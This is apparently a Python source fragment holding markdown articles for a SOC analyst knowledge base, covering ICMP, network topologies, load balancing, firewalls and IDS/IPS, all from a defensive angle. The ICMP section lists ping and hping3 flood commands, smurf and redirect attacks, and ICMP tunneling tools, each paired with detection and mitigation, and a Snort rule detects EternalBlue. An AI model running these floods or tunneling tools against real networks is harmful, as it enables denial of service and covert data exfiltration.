        r"""# ICMP and Network Diagnostics

## What ICMP Does

ICMP (Internet Control Message Protocol) is a supporting protocol for IP that
provides error reporting and diagnostic functions. It does not carry application
data but is essential for network operations.

## ICMP Message Types

### Common ICMP Types and Codes

| Type | Code | Name                        | Description                    |
|------|------|-----------------------------|--------------------------------|
| 0    | 0    | Echo Reply                  | Ping response                  |
| 3    | 0    | Destination Unreachable     | Network unreachable            |
| 3    | 1    | Destination Unreachable     | Host unreachable               |
| 3    | 3    | Destination Unreachable     | Port unreachable               |
| 3    | 4    | Destination Unreachable     | Fragmentation needed           |
| 3    | 13   | Destination Unreachable     | Administratively prohibited    |
| 5    | 0    | Redirect                    | Redirect for network           |
| 8    | 0    | Echo Request                | Ping request                   |
| 11   | 0    | Time Exceeded               | TTL expired (traceroute)       |
| 11   | 1    | Time Exceeded               | Fragment reassembly timeout    |

### ICMP Type Reference Diagram

```
Echo Request (8) ---------> Target
              <------------- Echo Reply (0)
              (This is "ping")

Packet with TTL=1 -------> Router
              <------------- Time Exceeded (11)
              (This is how traceroute works)

TCP to closed port -------> Target
              <------------- Dest Unreachable, Port (3/3)
              (UDP port scan uses this)

Packet too large ---------> Router (MTU limit)
              <------------- Dest Unreachable, Frag Needed (3/4)
              (Path MTU Discovery)
```

## Ping — Echo Request/Reply

```bash
# Basic ping
ping 8.8.8.8                    # Windows (4 pings default)
ping -c 4 8.8.8.8               # Linux (specify count)

# Continuous ping
ping -t 8.8.8.8                 # Windows (until Ctrl+C)
ping 8.8.8.8                    # Linux (continuous by default)

# Ping with specific packet size
ping -l 1472 8.8.8.8            # Windows
ping -s 1472 8.8.8.8            # Linux

# Ping with specific TTL
ping -i 5 8.8.8.8               # Linux (TTL=5)

# Ping with timestamp
ping -D 8.8.8.8                 # Linux (show timestamps)
```

### Interpreting Ping Output

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=12.3 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=11.8 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=12.1 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 11.800/12.067/12.300/0.205 ms

Key metrics:
  ttl=118:     Remaining TTL (started at 128, so 10 hops away)
  time=12.3ms: Round-trip time (latency)
  0% loss:     All packets returned
  mdev=0.205:  Jitter (variation in latency)
```

## Traceroute — Path Discovery

Traceroute sends packets with incrementing TTL values to discover the path:

```
TTL=1 -> First router decrements to 0, sends back Time Exceeded
TTL=2 -> Second router decrements to 0, sends back Time Exceeded
TTL=3 -> Third router...
...
TTL=N -> Destination reached, sends Echo Reply (or Port Unreachable)
```

```bash
# Standard traceroute
traceroute 8.8.8.8              # Linux (UDP by default)
tracert 8.8.8.8                 # Windows (ICMP by default)

# TCP traceroute (better through firewalls)
traceroute -T -p 443 8.8.8.8   # Linux

# ICMP traceroute on Linux
traceroute -I 8.8.8.8

# MTR (combines ping + traceroute, continuous)
mtr 8.8.8.8                    # Linux
mtr --report 8.8.8.8           # Generate report

# PathPing (Windows - combines ping + traceroute with statistics)
pathping 8.8.8.8
```

### Interpreting Traceroute

```
traceroute to 8.8.8.8 (8.8.8.8), 30 hops max
 1  192.168.1.1 (192.168.1.1)  1.234 ms  1.123 ms  1.345 ms
 2  10.0.0.1 (10.0.0.1)  5.432 ms  5.234 ms  5.567 ms
 3  * * *
 4  72.14.234.108  12.345 ms  12.123 ms  12.567 ms
 5  8.8.8.8  15.432 ms  15.234 ms  15.567 ms

Analysis:
  Hop 1: Local gateway (1ms - normal for LAN)
  Hop 2: ISP router (5ms - normal first hop to ISP)
  Hop 3: * * * means ICMP is filtered, not that hop is down
  Hop 4: Transit provider (12ms - reasonable)
  Hop 5: Destination reached (15ms total RTT)
```

## ICMP-Based Attacks

### Ping Flood (ICMP Flood)

```
Attacker sends massive volume of Echo Requests to overwhelm target.

ping -f 192.168.1.1             # Linux flood ping (requires root)
hping3 -1 --flood 192.168.1.1  # High-rate ICMP flood

Detection: Abnormally high ICMP traffic volume from single source
Mitigation: Rate-limit ICMP, block at perimeter during attack
```

### Smurf Attack (Amplification)

```
Attacker sends Echo Request to broadcast address with spoofed source IP:
  Source: Victim IP (spoofed)
  Destination: 192.168.1.255 (broadcast)

All hosts on the subnet respond to the victim simultaneously.

Amplification: If 200 hosts respond, 1 packet becomes 200.

Mitigation:
  - Disable directed broadcast on routers:
    no ip directed-broadcast     # Cisco
  - Modern networks block this by default
```

### Ping of Death

```
Historically: Send oversized ICMP packet (>65,535 bytes) causing buffer overflow.
Status: Patched in all modern OS. Primarily a historical reference.

Modern variant: Large ICMP packets can still be used for:
  - Bandwidth consumption
  - Firewall state table exhaustion
  - IDS evasion through fragmentation
```

### ICMP Tunneling

Encapsulating data within ICMP Echo Request/Reply payloads to exfiltrate data or
establish covert C2 channels:

```
Normal ping: 32-64 bytes of padding data
Tunnel ping: Actual data (commands, files) encoded in ICMP payload

Tools: ptunnel, icmpsh, icmptunnel, Hans

Detection:
  - ICMP packets with unusually large payloads (>100 bytes)
  - High volume of ICMP traffic to a single destination
  - ICMP sessions with consistent patterns (like TCP sessions)
  - Non-standard data in ICMP payload

Wireshark filter:
  icmp && data.len > 100       # Large ICMP payloads
  icmp.type == 8 && frame.len > 100   # Large echo requests
```

### ICMP Redirect Attack

```
Attacker sends ICMP Redirect (Type 5) to victim:
  "For destination X, use gateway Y" (attacker's machine)

Victim updates routing table, sends traffic through attacker.

Mitigation:
  - Most modern OS ignore ICMP redirects by default
  - Linux: net.ipv4.conf.all.accept_redirects = 0
  - Windows: Disabled by default in newer versions
```

## When to Allow vs Block ICMP

### Must Allow (Internal Network)

```
Type 3 (Destination Unreachable):
  - Code 4 (Fragmentation Needed) is ESSENTIAL for Path MTU Discovery
  - Blocking this breaks many applications

Type 11 (Time Exceeded):
  - Required for traceroute to function

Type 0/8 (Echo Reply/Request):
  - Needed for basic connectivity testing
```

### Should Consider Blocking (Perimeter)

```
Type 5 (Redirect):
  - Should always be blocked from external sources
  - Can redirect routing tables

Type 8 (Echo Request) inbound:
  - Blocking prevents external ping sweeps
  - But breaks legitimate monitoring and troubleshooting

Type 13/14 (Timestamp):
  - Information disclosure (OS fingerprinting)
  - Block at perimeter

Type 17/18 (Address Mask):
  - Information disclosure
  - Block at perimeter
```

### Recommended ICMP Firewall Policy

```
# Allow essential ICMP, block the rest:

# Inbound:
Allow Type 0   (Echo Reply - responses to our pings)
Allow Type 3   (Destination Unreachable - all codes, ESSENTIAL)
Allow Type 11  (Time Exceeded - traceroute responses)
Deny  Type 5   (Redirect - never accept from outside)
Deny  Type 8   (Echo Request - consider allowing rate-limited)
Deny  Type 13  (Timestamp Request)
Deny  Type 17  (Address Mask Request)

# Outbound:
Allow Type 8   (Echo Request - our pings)
Allow Type 3   (Destination Unreachable)
Allow Type 11  (Time Exceeded)
```

## ICMP in Packet Captures

```bash
# Capture all ICMP traffic
tcpdump -i eth0 icmp -n

# Capture ICMP with verbose output
tcpdump -i eth0 icmp -vvn

# Capture ICMP unreachable only
tcpdump -i eth0 'icmp[icmptype] == 3'

# Capture ICMP echo requests only
tcpdump -i eth0 'icmp[icmptype] == 8'

# Wireshark display filters:
icmp                              # All ICMP
icmp.type == 8                    # Echo requests
icmp.type == 3                    # Destination unreachable
icmp.type == 11                   # Time exceeded
icmp.type == 5                    # Redirects (suspicious)
icmp.resp_to                      # Show request/response pairs
```

## Key Analyst Takeaways

1. **Never block all ICMP** -- Type 3 Code 4 is essential for Path MTU Discovery
2. **ICMP tunneling is a real exfiltration technique** -- monitor for large ICMP payloads
3. **Ping failure does not mean host is down** -- ICMP may be filtered
4. **Traceroute asterisks mean filtering, not failure** -- the path may still work
5. **Smurf attacks are mostly historical** but the concept of amplification applies to other protocols
6. **ICMP redirects should be blocked** at the perimeter -- they enable routing manipulation
7. **Rate-limit ICMP** rather than blocking entirely for the best security/functionality balance
"""
    ))

    # -------------------------------------------------------------------------
    # Article 15: Network Topologies and Architecture Design
    # -------------------------------------------------------------------------
    articles.append((
        "Network Topologies and Architecture Design",
        ["networking", "topology", "architecture", "dmz", "defense-in-depth"],
        r"""# Network Topologies and Architecture Design

## Why Topology Matters for Security

Network topology determines traffic flow paths, failure domains, and security
boundaries. A well-designed topology limits the blast radius of breaches and
enables effective monitoring.

## Physical Topologies

### Star Topology

```
        +--------+
        | Switch |
        +---+----+
       / |  |  |  \
      /  |  |  |   \
    H1  H2  H3  H4  H5

Characteristics:
  - Central device (switch/hub) connects all nodes
  - Single point of failure at the center
  - Easy to add/remove devices
  - Most common LAN topology today
```

| Advantage                  | Disadvantage                    |
|----------------------------|---------------------------------|
| Easy troubleshooting       | Central device is SPOF          |
| Failure of one link is isolated | Cable runs to every host   |
| Easy to add new devices    | Requires more cabling           |

### Mesh Topology

```
Full Mesh:                  Partial Mesh:
  A-----B                     A-----B
  |\ /| |                    |     |
  | X | |                    |     |
  |/ \| |                    |     |
  C-----D                    C-----D

Full mesh: Every node connects to every other node
Partial mesh: Key nodes have redundant connections
```

| Advantage                  | Disadvantage                    |
|----------------------------|---------------------------------|
| High redundancy            | Expensive (n*(n-1)/2 links)     |
| No single point of failure | Complex management              |
| Multiple paths available   | Requires routing protocols      |

**Security note:** Full mesh is common for WAN links between data centers and for
firewall clusters requiring high availability.

### Hub-and-Spoke (Star WAN)

```
           +--------+
     +-----|  Hub   |-----+
     |     | (HQ)   |     |
     |     +--------+     |
     |         |          |
  +--+--+  +--+--+  +----+--+
  |Spoke|  |Spoke|  | Spoke  |
  |Site1|  |Site2|  | Site3  |
  +-----+  +-----+  +-------+

All traffic between spokes must traverse the hub.
```

**Security advantage:** Central point of inspection at the hub.
**Security disadvantage:** Hub is a single point of failure; high-value target.

## Enterprise Architecture Models

### Three-Tier Architecture

```
                    +------------------+
                    |   Core Layer     |  High-speed backbone
                    | (Core switches)  |  Routing between buildings
                    +--------+---------+
                       |          |
              +--------+--+  +---+---------+
              |Distribution|  |Distribution |  Policy enforcement
              |  Layer     |  |  Layer      |  Inter-VLAN routing
              +-----+------+  +------+------+  ACLs, QoS
                    |                |
              +-----+------+  +------+------+
              |  Access    |  |  Access     |  User/device connections
              |  Layer     |  |  Layer      |  Port security, 802.1X
              +------------+  +-------------+  VLAN assignment

Core:         High-speed switching, minimal policy
Distribution: Policy enforcement, routing, filtering
Access:       User connectivity, port-level security
```

### Spine-Leaf Architecture (Data Center)

```
    Spine 1      Spine 2      Spine 3
    +-----+      +-----+      +-----+
    |     |      |     |      |     |
    +--+--+      +--+--+      +--+--+
   /|  |  \    /  | |  \    /  |  |\
  / |  |   \  /   | |   \  /   |  | \
+--++ +--+ +--+ +--+ +--+ +--+ +--+ +--+
|L1 | |L2| |L3| |L4| |L5| |L6| |L7| |L8|
+---+ +--+ +--+ +--+ +--+ +--+ +--+ +--+
Leaf switches (every leaf connects to every spine)

Advantages:
  - Predictable latency (max 2 hops between any two servers)
  - Easy to scale (add more spines or leaves)
  - No spanning tree needed (uses ECMP routing)
  - Equal bandwidth to all points
```

**Security consideration:** East-west traffic (server-to-server) is dominant in
modern data centers. Spine-leaf enables micro-segmentation with distributed
firewalls.

## DMZ Design Patterns

### Single-Firewall DMZ

```
    Internet
        |
  +-----+-----+
  |  Firewall  |
  | (3 zones)  |
  +--+--+--+--+
     |  |  |
     |  |  +------> Internal Network (trusted)
     |  |
     |  +---------> DMZ (semi-trusted)
     |               Web, Mail, DNS servers
     |
     +------------> Internet (untrusted)

Firewall rules:
  Internet -> DMZ:    Allow HTTP(S), SMTP, DNS
  DMZ -> Internal:    Allow specific DB connections only
  Internet -> Internal: DENY ALL
  Internal -> Internet: Allow via proxy
  Internal -> DMZ:      Allow management (SSH, RDP)
```

### Dual-Firewall DMZ (Recommended)

```
    Internet
        |
  +-----+-----+
  | Firewall 1 |  (External -- different vendor ideally)
  | (Perimeter)|
  +-----+------+
        |
  +-----+------+
  |    DMZ     |  Web servers, reverse proxies, mail relays
  +-----+------+
        |
  +-----+------+
  | Firewall 2 |  (Internal -- different vendor)
  | (Internal) |
  +-----+------+
        |
  +-----+------+
  |  Internal  |  Workstations, databases, domain controllers
  |  Network   |
  +------------+

Advantage: Compromise of one firewall does not grant full access.
An attacker must bypass TWO different firewalls.
```

### Screened Subnet (Modern DMZ)

```
    Internet
        |
  +-----+------+--------+
  |  Firewall (zones)    |
  |  Outside | DMZ | Inside |
  +--+-------+--+--+--+-+
     |          |     |
  Internet    DMZ   Internal
              Zone    Zone

Modern next-gen firewalls handle multiple zones in a single device
with granular policy between every zone pair.
```

## Defense in Depth Network Architecture

```
Layer 1: Perimeter
  - Edge router with ACLs
  - DDoS mitigation (cloud or appliance)
  - BGP route filtering

Layer 2: Perimeter Firewall
  - Stateful inspection
  - IPS inline
  - VPN termination

Layer 3: DMZ
  - Web Application Firewall (WAF)
  - Reverse proxies
  - Mail gateways with anti-spam/anti-malware

Layer 4: Internal Firewall
  - Micro-segmentation between zones
  - Application-aware policies

Layer 5: Network Segmentation
  - VLANs with ACLs
  - Private VLANs for server isolation

Layer 6: Host-Based Controls
  - Host firewalls
  - Endpoint Detection and Response (EDR)
  - Application whitelisting

Layer 7: Data Protection
  - Encryption at rest and in transit
  - DLP (Data Loss Prevention)
  - Access controls on data stores
```

## Zero Trust Network Architecture

```
Traditional (Castle-and-Moat):
  Trusted inside | Firewall | Untrusted outside
  Once inside, everything is accessible

Zero Trust:
  No implicit trust anywhere
  Every access request is verified:
    - Identity (who are you?)
    - Device health (is your device compliant?)
    - Context (where, when, what?)
    - Least privilege (minimum access needed)

Components:
  +-------------------+
  | Identity Provider | -> Authenticate every request
  +-------------------+
  | Policy Engine     | -> Evaluate trust continuously
  +-------------------+
  | Policy Enforcement| -> Micro-segment at application level
  +-------------------+
  | Data Plane        | -> Encrypt everything, log everything
  +-------------------+
```

## Network Monitoring Points

```
Key tap/SPAN locations:
                    Internet
                        |
              [TAP 1: Perimeter] -- See all ingress/egress
                        |
                  +-----+-----+
                  |  Firewall  |
                  +-----+------+
                        |
              [TAP 2: DMZ]     -- Monitor DMZ traffic
                        |
                  +-----+-----+
                  | Core Switch|
                  +--+--+--+--+
                     |  |  |
           [TAP 3: East-West] -- Lateral movement detection
                     |  |  |
                   VLAN segments

TAP vs SPAN:
  TAP:  Physical device, copies all traffic, no packet loss
  SPAN: Switch feature, mirrors ports, can drop packets under load

Best practice: Use TAPs for critical monitoring points, SPAN for ad-hoc
```

## Key Analyst Takeaways

1. **Know your network topology** -- you cannot defend what you do not understand
2. **DMZ design matters** -- dual-firewall DMZ provides strongest segmentation
3. **Defense in depth means controls at every layer** not just the perimeter
4. **Three-tier architecture** defines where to place security controls
5. **Monitoring points** should cover perimeter, DMZ, and east-west traffic
6. **Zero trust is the direction** -- do not rely on network location for trust
7. **Spine-leaf architecture requires distributed security** -- centralized firewalls miss east-west traffic
"""
    ))

    # -------------------------------------------------------------------------
    # Article 16: Load Balancing and High Availability
    # -------------------------------------------------------------------------
    articles.append((
        "Load Balancing and High Availability",
        ["networking", "load-balancing", "high-availability", "failover", "clustering"],
        r"""# Load Balancing and High Availability

## What Load Balancing Does

A load balancer distributes incoming network traffic across multiple backend servers
to ensure no single server is overwhelmed. It improves availability, reliability,
and performance.

```
                   Clients
                  /  |  \
                 /   |   \
           +-----+---+----+-----+
           |   Load Balancer    |
           | (Virtual IP: VIP) |
           +--+-----+-----+---+
              |     |     |
           +--+--+ +-+-+ +--+--+
           |Srv 1| |S 2| |Srv 3|
           +-----+ +---+ +-----+

Clients connect to a single VIP (Virtual IP).
Load balancer selects a backend server for each connection.
```

## Layer 4 vs Layer 7 Load Balancing

### Layer 4 (Transport Layer)

```
Decisions based on: IP address + Port number
Does NOT inspect application content
Fast, efficient, protocol-agnostic

Example:
  Client -> VIP:443 -> Load Balancer -> Server1:443
  (LB chooses server based on IP/port, not URL or headers)

Use cases:
  - TCP/UDP load balancing
  - Database connection distribution
  - Non-HTTP protocols
  - When speed is critical

Products: HAProxy (TCP mode), AWS NLB, F5 (L4 mode)
```

### Layer 7 (Application Layer)

```
Decisions based on: HTTP headers, URL path, cookies, content
Inspects and understands application protocols
More flexible, slightly more latency

Example:
  /api/*    -> API server pool
  /images/* -> Static content servers
  /app/*    -> Application server pool

Use cases:
  - HTTP(S) load balancing
  - URL-based routing
  - A/B testing
  - SSL termination
  - Web Application Firewall integration

Products: HAProxy (HTTP mode), AWS ALB, Nginx, F5, Envoy
```

### Comparison

| Feature          | Layer 4              | Layer 7               |
|------------------|----------------------|-----------------------|
| Speed            | Faster               | Slightly slower       |
| Visibility       | IP + Port only       | Full application data |
| SSL termination  | Pass-through or term | Full termination      |
| Content routing  | No                   | Yes (URL, header)     |
| WAF integration  | No                   | Yes                   |
| Protocol support | Any TCP/UDP          | HTTP, HTTPS primarily |
| Connection model | Per-connection       | Per-request possible  |

## Load Balancing Algorithms

| Algorithm           | How It Works                          | Best For                |
|---------------------|---------------------------------------|-------------------------|
| Round Robin         | Rotate through servers sequentially   | Equal-capacity servers  |
| Weighted Round Robin| More requests to higher-weight servers| Mixed-capacity servers  |
| Least Connections   | Send to server with fewest connections| Varying request duration|
| Weighted Least Conn | Least connections with server weights | Mixed capacity + varying|
| IP Hash             | Hash source IP to select server       | Session persistence     |
| URL Hash            | Hash URL path to select server        | Cache optimization      |
| Random              | Random server selection               | Simple, fair            |
| Least Response Time | Send to fastest-responding server     | Performance-critical    |

## Health Checks

The load balancer continuously monitors backend servers to avoid sending traffic
to failed servers:

```
Health Check Types:

TCP Check:
  - Connect to port, verify TCP handshake
  - Fast, basic (only confirms port is open)

HTTP Check:
  - Send GET /health, expect 200 OK
  - Validates application is responding

Custom Script:
  - Run arbitrary check (database query, disk space, etc.)
  - Most thorough but most complex

Health Check Configuration (HAProxy example):
  backend web_servers
    balance roundrobin
    option httpchk GET /health
    http-check expect status 200

    server web1 192.168.1.10:80 check inter 5s fall 3 rise 2
    server web2 192.168.1.11:80 check inter 5s fall 3 rise 2
    server web3 192.168.1.12:80 check inter 5s fall 3 rise 2

  inter 5s:  Check every 5 seconds
  fall 3:    Mark as down after 3 consecutive failures
  rise 2:    Mark as up after 2 consecutive successes
```

## Session Persistence (Sticky Sessions)

Some applications require the same client to always reach the same server:

```
Methods:
  Source IP:     Hash client IP (breaks behind NAT/proxy)
  Cookie:        Insert LB cookie identifying the server
  URL Parameter: Encode server ID in URL
  SSL Session:   Use TLS session ID for persistence

# HAProxy cookie-based persistence:
backend app_servers
  cookie SERVERID insert indirect nocache
  server app1 192.168.1.10:8080 cookie s1
  server app2 192.168.1.11:8080 cookie s2
```

**Security note:** Sticky sessions can make DDoS more effective -- all attack traffic
hits one server instead of being distributed.

## SSL/TLS Termination

```
Option 1: SSL Termination at LB
  Client --[HTTPS]--> LB --[HTTP]--> Server
  LB decrypts, can inspect content, re-encrypts optional
  Advantage: LB can apply WAF rules, content-based routing
  Disadvantage: Traffic unencrypted between LB and server

Option 2: SSL Pass-through
  Client --[HTTPS]--> LB --[HTTPS]--> Server
  LB cannot inspect content (encrypted)
  Advantage: End-to-end encryption
  Disadvantage: No content-based routing, no WAF at LB

Option 3: SSL Re-encryption (SSL Bridging)
  Client --[HTTPS]--> LB --[HTTPS]--> Server
  LB decrypts, inspects, re-encrypts with internal cert
  Advantage: Inspection + encryption
  Disadvantage: Performance overhead, certificate management
```

## High Availability Configurations

### Active-Passive (Failover)

```
  +--------+         +--------+
  | Active |         | Standby|
  |   LB   | <-----> |   LB   |
  | (VIP)  | heartbeat| (idle)|
  +--------+         +--------+

- Active handles all traffic
- Standby monitors via heartbeat
- If active fails, standby takes over VIP
- Failover time: typically 1-10 seconds
```

### Active-Active

```
  +--------+         +--------+
  |  LB 1  |         |  LB 2  |
  | (active)| <-----> |(active)|
  +--------+         +--------+
      \                  /
       \                /
        +------+-------+
        | DNS / ECMP   |
        | distributes  |
        | to both LBs  |
        +--------------+

- Both LBs handle traffic simultaneously
- DNS round-robin or ECMP routing distributes
- Better utilization of resources
- More complex state synchronization
```

### VRRP / HSRP (Gateway Redundancy)

```
  +--------+         +--------+
  | Router | VRRP/   | Router |
  |   A    | HSRP    |   B    |
  | Master | <-----> | Backup |
  +--------+         +--------+
      |                  |
  ----+------ LAN -------+----
              |
           VIP: 192.168.1.1

VRRP (open standard) / HSRP (Cisco proprietary)
Provides a virtual gateway IP shared between routers.
If master fails, backup assumes the virtual IP.
```

## Security Considerations

### Load Balancer as Security Control

```
The LB is a natural enforcement point:
  1. SSL termination enables traffic inspection
  2. Rate limiting per client IP
  3. Connection limits prevent resource exhaustion
  4. Integration with WAF for application protection
  5. DDoS absorption (distribute across many servers)
  6. Access control lists (block malicious IPs)
```

### Load Balancer Attack Surface

```
Risks:
  - LB itself is a single point of failure (if not HA)
  - Misconfigured health checks can expose internal paths
  - SSL certificate management (expiration, weak ciphers)
  - Management interface exposure
  - State table exhaustion (L4 LBs maintain connection state)
  - Cookie manipulation (if using cookie-based persistence)
  - Backend server exposure if LB bypassed
```

### Monitoring Load Balancers

```bash
# Key metrics to monitor:
  - Active connections per server
  - Request rate (requests/second)
  - Error rates (5xx responses)
  - Backend server health status
  - SSL certificate expiration
  - Response time per backend
  - Connection queue depth

# HAProxy stats page:
# Usually at http://lb-ip:8404/stats

# HAProxy CLI:
echo "show stat" | socat stdio /var/run/haproxy.sock

# Nginx status:
curl http://lb-ip/nginx_status
```

## Key Analyst Takeaways

1. **The load balancer sees all traffic** -- its logs are valuable for investigation
2. **L7 LBs can inspect encrypted traffic** after SSL termination
3. **Health check endpoints** should not expose sensitive information
4. **Sticky sessions can concentrate DDoS impact** on a single backend
5. **HA configuration prevents the LB from being a SPOF**
6. **LB management interfaces** must be restricted to management networks
7. **Certificate management on LBs** is critical -- expired certs cause outages
8. **Source IP preservation** matters for logging -- check X-Forwarded-For headers
"""
    ))

    return articles


def network_infrastructure_articles():
    """Return 16 network infrastructure and security device articles for the SOC analyst knowledge base."""
    articles = []

    # -------------------------------------------------------------------------
    # Article 1: Firewalls Stateful Stateless and Next-Generation
    # -------------------------------------------------------------------------
    articles.append((
        "Firewalls Stateful Stateless and Next-Generation",
        ["infrastructure", "firewalls", "ngfw", "packet-filtering", "network-security"],
        r"""# Firewalls: Stateful, Stateless, and Next-Generation

## Overview

Firewalls are the foundational perimeter defense in every network. Understanding how
different firewall types process traffic is essential for SOC analysts who must interpret
firewall logs, write rules, and investigate blocked or allowed connections.

## Firewall Types Comparison

| Feature | Stateless (Packet Filter) | Stateful Inspection | Next-Generation (NGFW) |
|---|---|---|---|
| Inspection Layer | L3-L4 headers only | L3-L4 with connection tracking | L3-L7 full stack |
| Connection Tracking | No | Yes (state table) | Yes |
| Application Awareness | No | No | Yes (App-ID) |
| User Identity | No | No | Yes (User-ID) |
| IPS Integration | No | No | Yes |
| TLS Decryption | No | No | Yes |
| Performance Impact | Minimal | Low-moderate | Moderate-high |
| Example Platforms | Linux iptables, ACLs | ASA, iptables conntrack | Palo Alto, Fortinet, Check Point |

## Stateless Packet Filtering

Stateless firewalls examine each packet independently against a rule list. They have no
memory of previous packets, so return traffic must be explicitly permitted.

### Linux iptables Example (Stateless Approach)

```bash
# Allow inbound HTTP
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Must explicitly allow return traffic from port 80
iptables -A INPUT -p tcp --sport 80 -j ACCEPT

# Drop everything else
iptables -A INPUT -j DROP
```

**SOC concern:** Stateless rules that allow all traffic from high source ports (1024-65535)
create a massive attack surface. Attackers can bypass these by sourcing from allowed ports.

## Stateful Inspection

Stateful firewalls maintain a connection (state) table that tracks TCP handshakes, UDP
pseudo-connections, and related ICMP messages. Return traffic is automatically permitted
if it belongs to an established connection.

### iptables Stateful Rules

```bash
# Track connections
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow new inbound HTTP
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT

# Allow new inbound HTTPS
iptables -A INPUT -p tcp --dport 443 -m conntrack --ctstate NEW -j ACCEPT

# Drop invalid packets
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# Default deny
iptables -A INPUT -j DROP
```

### Connection State Table

| State | Description |
|---|---|
| NEW | First packet of a connection (SYN for TCP) |
| ESTABLISHED | Packets belonging to a tracked connection |
| RELATED | New connection related to an existing one (e.g., FTP data) |
| INVALID | Packet that does not match any known connection |

## Next-Generation Firewalls (NGFW)

NGFWs add deep packet inspection, application identification, user-based policies, and
integrated threat prevention on top of stateful inspection.

### Palo Alto Example Policy (Conceptual)

```text
Rule Name: Allow-Web-Browsing
  Source Zone:      Trust
  Source User:      domain\standard-users
  Destination Zone: Untrust
  Application:      web-browsing, ssl
  Service:          application-default
  Action:           Allow
  Profile Group:    Strict-Security
    - Antivirus:    strict
    - Anti-Spyware: strict
    - Vulnerability: strict
    - URL Filtering: default-corporate
    - File Blocking: strict
    - WildFire:     forward-all
```

### Application vs Port-Based Rules

```text
# Traditional port-based (old approach)
permit tcp any any eq 443   <-- allows ANY app on port 443

# Application-based (NGFW approach)
allow application ssl, web-browsing on port 443
deny  application bittorrent on any port   <-- blocks even if on port 443
```

## Rule Processing Order

Firewalls process rules **top-down, first match wins**:

```text
Rule 1: Deny   IP 10.0.0.50   -> any        (block compromised host)
Rule 2: Allow  IP 10.0.0.0/24 -> 10.1.0.0/24 port 443
Rule 3: Allow  IP 10.0.0.0/24 -> DNS-Servers port 53
Rule 4: Deny   IP any         -> any         (implicit deny)
```

**Key principle:** Specific rules go at the top, general rules at the bottom. The implicit
deny at the bottom (last rule) drops everything not explicitly permitted.

## Zone-Based Architecture

Modern firewalls organize interfaces into security zones:

```text
                    +------------------+
   Internet --------| UNTRUST zone     |
                    |                  |
   Users -----------| TRUST zone       |--- Firewall
                    |                  |
   Servers ---------| DMZ zone         |
                    |                  |
   Management ------| MGMT zone        |
                    +------------------+

Inter-zone traffic: requires explicit policy
Intra-zone traffic: typically allowed by default (configurable)
```

### Zone Policy Matrix

| Source Zone | Dest Zone | Typical Policy |
|---|---|---|
| Trust | Untrust | Allow with inspection |
| Trust | DMZ | Allow specific services |
| Untrust | DMZ | Allow HTTP/HTTPS only |
| Untrust | Trust | Deny (except established) |
| DMZ | Trust | Deny (except specific DB ports) |
| Any | Mgmt | Deny (except admin IPs) |

## SOC Analyst Firewall Log Analysis

### Common Log Fields to Examine

```text
Date/Time | Source IP | Src Port | Dest IP | Dst Port | Protocol | Action | Rule | Bytes
2026-02-15 14:32:01 | 10.0.1.50 | 49832 | 203.0.113.5 | 443 | TCP | allow | rule-2 | 15234
2026-02-15 14:32:05 | 198.51.100.9 | 44123 | 10.0.2.10 | 22 | TCP | deny | implicit | 0
```

### Indicators of Concern in Firewall Logs

| Pattern | Possible Meaning |
|---|---|
| High volume of denied outbound | Malware C2 attempts |
| Allowed traffic to known-bad IPs | Active compromise |
| Internal host scanning many ports | Lateral movement |
| Traffic on non-standard ports | Tunneling or evasion |
| Denied inbound from single IP | Reconnaissance scan |
| Outbound DNS to non-corporate servers | DNS exfiltration |

## Firewall Hardening Checklist

1. Change default admin credentials
2. Disable unused interfaces
3. Enable logging for all deny rules and critical allow rules
4. Implement anti-spoofing (ingress/egress filtering)
5. Set session timeouts (TCP idle: 3600s, UDP: 30s)
6. Restrict management access to dedicated MGMT interface
7. Keep firmware and signatures current
8. Review rules quarterly -- remove unused rules
9. Enable threat prevention profiles on allow rules (NGFW)
10. Back up configurations and use version control

## Key Takeaways for SOC Analysts

- Always check which rule matched a log entry -- implicit deny vs explicit deny tells different stories
- NGFW application logs reveal tunneling that port-based logs miss
- Firewall rule order matters -- a misplaced broad allow rule can negate specific deny rules
- Correlate firewall logs with IDS/IPS and endpoint telemetry for full visibility
- When investigating, check both inbound AND outbound firewall logs
"""
    ))

    # -------------------------------------------------------------------------
    # Article 2: IDS and IPS Architecture and Deployment
    # -------------------------------------------------------------------------
    articles.append((
        "IDS and IPS Architecture and Deployment",
        ["infrastructure", "ids", "ips", "intrusion-detection", "snort", "suricata"],
        r"""# IDS and IPS Architecture and Deployment

## Overview

Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) monitor network
traffic or host activity for malicious behavior. The core difference: IDS alerts on threats,
IPS actively blocks them. SOC analysts must understand deployment modes, detection methods,
and tuning to manage these systems effectively.

## IDS vs IPS Comparison

| Feature | IDS | IPS |
|---|---|---|
| Deployment | Passive (copy of traffic) | Inline (traffic flows through) |
| Action | Alert only | Alert and block |
| Latency Impact | None | Adds small latency |
| Failure Mode | Network unaffected | Can disrupt traffic (fail-open/closed) |
| False Positive Impact | Alert fatigue | Legitimate traffic blocked |
| Use Case | Detection, forensics | Active prevention |

## Detection Methods

### Signature-Based Detection

Matches traffic against known attack patterns. Fast and accurate for known threats
but blind to zero-days.

```text
# Snort signature example - detects EternalBlue exploit
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"EXPLOIT-KIT EternalBlue SMB exploit attempt";
    flow:to_server,established;
    content:"|FF|SMB";
    content:"|23 00 00 00 07 00|";
    sid:1000001; rev:1;
    classtype:attempted-admin;
    reference:cve,2017-0144;
)
```

### Anomaly-Based Detection

Establishes a baseline of normal behavior and alerts on deviations. Can detect
zero-days but produces more false positives.

| Baseline Metric | Normal | Anomaly Example |
|---|---|---|
| DNS queries/min per host | 5-20 | 500+ (possible tunneling) |
| Outbound connections/hr | 50-200 | 5000+ (scanning or worm) |
| Average packet size | 800-1200 bytes | Consistent 64 bytes (beaconing) |
| New external IPs contacted | 10-30/day | 300+ (C2 or exfil) |

